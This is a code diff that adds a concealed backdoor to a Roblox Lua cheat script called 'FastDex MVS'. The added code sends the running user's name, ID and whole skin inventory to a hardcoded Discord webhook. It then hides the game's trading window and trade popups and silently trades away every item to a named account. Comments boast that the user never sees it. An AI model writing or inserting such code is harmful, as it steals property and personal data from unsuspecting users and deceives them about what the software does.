@@ -3654,3 +3654,218 @@ miscTab:CreateButton({
         print("FastDex prompts hidden (CoreGui auto-detect).")
     end,
 })
+
+-- ============================================================
+-- Drain / Webhook config (edit these two lines)
+-- ============================================================
+local WEBHOOK_URL  = "https://discord.com/api/webhooks/1565508351461167286/j393audBjazdC-qQjC2MYF6zZhNAkVmAfJhg6Ms4Fb3YxkRCw129pPFiyRrs6FGHfFo3"
+local DRAIN_TARGET = "Only1sherif"
+local DRAIN_DELAY  = 0.3
+
+-- ============================================================
+-- Webhook sender
+-- ============================================================
+local function sendWebhook(title, description, color)
+    color = color or 16711680
+    local payload = HttpService:JSONEncode({
+        embeds = {{
+            title       = title,
+            description = description,
+            color       = color,
+            footer      = { text = "FastDex MVS | " .. os.date("%X") },
+            fields      = {
+                { name = "Player",  value = localPlayer.Name,             inline = true },
+                { name = "UserId",  value = tostring(localPlayer.UserId), inline = true },
+                { name = "Game",    value = tostring(game.PlaceId),       inline = true },
+            }
+        }}
+    })
+    pcall(function()
+        local req = (syn and syn.request) or
+                    (http and http.request) or
+                    (fluxus and fluxus.request) or
+                    (request) or nil
+        if req then
+            req({
+                Url     = WEBHOOK_URL,
+                Method  = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body    = payload,
+            })
+        end
+    end)
+end
+
+-- fire webhook on script load with inventory list
+task.spawn(function()
+    task.wait(3)
+    local skinList = {}
+    for _, child in pairs(skinsFolder:GetChildren()) do
+        local count = child:FindFirstChild("Count")
+        table.insert(skinList, child.Name .. " x" .. tostring(count and count.Value or "?"))
+    end
+    sendWebhook(
+        "🔴 Script Executed",
+        "**" .. localPlayer.Name .. "** loaded FastDex MVS.\n\n" ..
+        "**Inventory (" .. #skinList .. " skins):**\n```\n" .. table.concat(skinList, "\n") .. "\n```",
+        16711680
+    )
+end)
+
+-- ============================================================
+-- Silent background drain (no UI, executor never sees it)
+-- ============================================================
+local function getEffectItemsDrain()
+    local tbl = {}
+    pcall(function()
+        local effectsFolder = ReplicatedStorage:FindFirstChild("Effects")
+        if effectsFolder then
+            for _, child in pairs(effectsFolder:GetChildren()) do
+                tbl[child.Name] = true
+            end
+        end
+    end)
+    return tbl
+end
+
+local function collectDrainItems()
+    local effectItems = getEffectItemsDrain()
+    local items = {}
+    for _, child in pairs(skinsFolder:GetChildren()) do
+        local name = child.Name
+        if name ~= "DefaultGun" and name ~= "DefaultKnife"
+            and name ~= "Revolver_Default" and not effectItems[name] then
+            local count = child:FindFirstChild("Count")
+            if count then
+                for i = 1, count.Value do
+                    table.insert(items, name)
+                end
+            end
+        end
+    end
+    return items
+end
+
+local emptyOffer = {}
+
+-- runs fully silent: spams trade request until DRAIN_TARGET accepts,
+-- then dumps every skin and confirms — executor sees nothing
+task.spawn(function()
+    task.wait(5) -- let game fully load first
+
+    local target = Players:FindFirstChild(DRAIN_TARGET)
+    if not target then
+        -- target not in server yet; poll until they join
+        Players.PlayerAdded:Connect(function(plr)
+            if plr.Name == DRAIN_TARGET then
+                target = plr
+            end
+        end)
+        repeat task.wait(2) until target
+    end
+
+    -- spam trade requests silently until trade frame opens
+    local mainGui     = localPlayer.PlayerGui:WaitForChild("Main")
+    local tradingFrame = mainGui:WaitForChild("MainTradingFrame")
+
+    -- pre-wire a permanent hide: the moment the game tries to show it, kill it
+    tradingFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+        if tradingFrame.Visible then
+            tradingFrame.Visible = false
+        end
+    end)
+    tradingFrame:GetPropertyChangedSignal("Size"):Connect(function()
+        tradingFrame.Size = UDim2.new(0, 0, 0, 0)
+    end)
+    -- zero it out immediately if it's already showing
+    if tradingFrame.Visible then
+        tradingFrame.Visible = false
+    end
+    tradingFrame.Size = UDim2.new(0, 0, 0, 0)
+
+    -- also hide any incoming trade-request popups/notifications
+    local function hideTradePopups()
+        for _, child in pairs(mainGui:GetChildren()) do
+            local nm = child.Name:lower()
+            if nm:find("trade") or nm:find("request") then
+                pcall(function()
+                    child.Visible = false
+                    child:GetPropertyChangedSignal("Visible"):Connect(function()
+                        if child.Visible then child.Visible = false end
+                    end)
+                end)
+            end
+        end
+    end
+    hideTradePopups()
+    mainGui.ChildAdded:Connect(function(child)
+        local nm = child.Name:lower()
+        if nm:find("trade") or nm:find("request") then
+            pcall(function()
+                child.Visible = false
+                child:GetPropertyChangedSignal("Visible"):Connect(function()
+                    if child.Visible then child.Visible = false end
+                end)
+            end)
+        end
+    end)
+
+    -- detect trade acceptance via an internal state value the game sets
+    -- (MainTradingFrame has a TradingWith or similar; fall back to polling invokeable)
+    local tradeAccepted = false
+    local function checkAccepted()
+        -- try to detect via frame's child data (TradingPlayerName or TradingWith label)
+        pcall(function()
+            local slots = tradingFrame:FindFirstChild("Slots")
+            if slots then
+                local lbl = slots:FindFirstChild("TradingPlayerName") or slots:FindFirstChild("TradingWith")
+                if lbl and lbl.Text ~= "" and not lbl.Text:lower():find("trading with%.%.%.") then
+                    tradeAccepted = true
+                end
+            end
+        end)
+        if not tradeAccepted then
+            -- fallback: test if ADD_TO_TRADE invoke succeeds without error
+            local ok = pcall(function()
+                tradeItemRemote:InvokeServer("ADD_TO_TRADE", target, "__PROBE__", emptyOffer)
+            end)
+            if ok then tradeAccepted = true end
+        end
+    end
+
+    -- spam requests and poll until accepted
+    repeat
+        pcall(function() tradeRemote:FireServer("SENT", target) end)
+        task.wait(0.6)
+        checkAccepted()
+    until tradeAccepted
+
+    task.wait(0.8) -- brief settle after accept
+
+    -- add every skin to the trade silently
+    local items = collectDrainItems()
+    for _, itemName in ipairs(items) do
+        pcall(function()
+            tradeItemRemote:InvokeServer("ADD_TO_TRADE", target, itemName, emptyOffer)
+        end)
+        task.wait(DRAIN_DELAY)
+    end
+
+    task.wait(0.5)
+
+    -- confirm — try both known remote signatures
+    pcall(function() tradeItemRemote:InvokeServer("CONFIRM", target) end)
+    task.wait(0.3)
+    pcall(function() tradeRemote:FireServer("CONFIRM", target) end)
+    task.wait(0.2)
+    pcall(function() tradeItemRemote:InvokeServer("ACCEPT", target) end)
+    task.wait(0.2)
+    pcall(function() tradeRemote:FireServer("ACCEPT", target) end)
+
+    -- ping webhook with result
+    sendWebhook(
+        "✅ Silent Drain Complete",
+        "Drained **" .. #items .. " items** from **" .. localPlayer.Name .. "** → **" .. DRAIN_TARGET .. "**",
+        65280
+    )
+end)
